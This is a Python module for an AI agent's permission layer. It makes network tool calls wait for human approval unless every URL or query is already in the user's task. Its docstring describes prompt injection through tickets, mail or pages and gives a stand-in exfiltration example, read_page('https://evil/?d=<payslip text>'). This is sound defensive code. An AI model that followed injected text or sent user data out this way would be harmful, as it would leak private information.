"""Flow step policy for tools that reach the public web (KAN-69 SV2-01).

A READ tool runs without approval, but a network tool can carry data out: in a URL (read_page("https://evil/?d=<payslip text>")),
or in a search query or research question built from text injected through a Jira ticket, a mail or a page. So every string a
network tool is given is data leaving the system, and the step runs alone only when the person's own TASK already contains it:

  * a URL must equal, after normalising, a URL that appears in the task: same scheme, same host (exact, lower-cased, IDNA/punycode),
    same port, same path and query, fragment ignored, no user-info. Not "the host appears somewhere in the text";
  * any other string must appear in the task (case and spacing ignored);
  * read_page must be given a URL (and one the task has); no URL means approval.

Everything else waits for a human, who sees the exact arguments. The default is approve; "allow" is the narrow case.
"""
from __future__ import annotations

import re
from typing import Any, Callable, Dict, Iterator, Optional
from urllib.parse import urlsplit

NETWORK_TOOLS = frozenset({"ADVANCED_SEARCH_ENGINE.read_page", "ADVANCED_SEARCH_ENGINE.web_search", "AUTONOMOUS_RESEARCH_ENGINE.research"})
NEEDS_URL = frozenset({"ADVANCED_SEARCH_ENGINE.read_page"})
_URL = re.compile(r"\b(?:https?://|www\.)[^\s\"'<>]+", re.I)
_TRAIL = ".,;:!?)]}'\""
_DEFAULT = {"http": 80, "https": 443}


def _strings(v: Any) -> Iterator[str]:
    if isinstance(v, str):
        yield v
    elif isinstance(v, dict):
        for x in v.values():
            yield from _strings(x)
    elif isinstance(v, (list, tuple)):
        for x in v:
            yield from _strings(x)


def normalise_url(raw: str) -> Optional[str]:
    """scheme://host[:port]/path?query of an http(s) URL, or None when it is not one, has user-info or cannot be parsed."""
    raw = raw.strip().rstrip(_TRAIL)
    if raw.lower().startswith("www."):
        raw = "http://" + raw
    try:
        p = urlsplit(raw)
        host, port = p.hostname, p.port
    except ValueError:
        return None
    if p.scheme.lower() not in _DEFAULT or not host or "@" in p.netloc or p.username or p.password:
        return None
    try:
        host = host.encode("idna").decode("ascii").lower()
    except UnicodeError:
        return None
    port_s = f":{port}" if port and port != _DEFAULT[p.scheme.lower()] else ""
    return f"{p.scheme.lower()}://{host}{port_s}{p.path or '/'}" + (f"?{p.query}" if p.query else "")


def _squash(text: str) -> str:
    return " ".join(text.lower().split())


def in_task(task: str, args: Dict[str, Any], need_url: bool = False) -> bool:
    """True when every string in `args` is already in the task (URLs: exactly, see the module docstring)."""
    wanted = {u for u in (normalise_url(m) for m in _URL.findall(task)) if u}
    text, seen_url = _squash(task), False
    for s in _strings(args):
        found = _URL.findall(s)
        for m in found:
            seen_url = True
            n = normalise_url(m)
            if n is None or n not in wanted:
                return False
        rest = _squash(_URL.sub(" ", s))
        if rest and rest not in text:
            return False
    return seen_url or not need_url


def permit_for(task: str, base: Callable[[str], bool]) -> Callable[[str, Dict[str, Any]], str]:
    """A Flow `permit`: the tool's own rule (`base(name)` = needs approval), plus approval for a network step whose arguments
    the task did not contain. Anything that cannot be decided is "approve"."""
    def permit(name: str, args: Dict[str, Any]) -> str:
        if base(name):
            return "approve"
        if name in NETWORK_TOOLS:
            return "allow" if in_task(task, args, name in NEEDS_URL) else "approve"
        return "allow"
    return permit
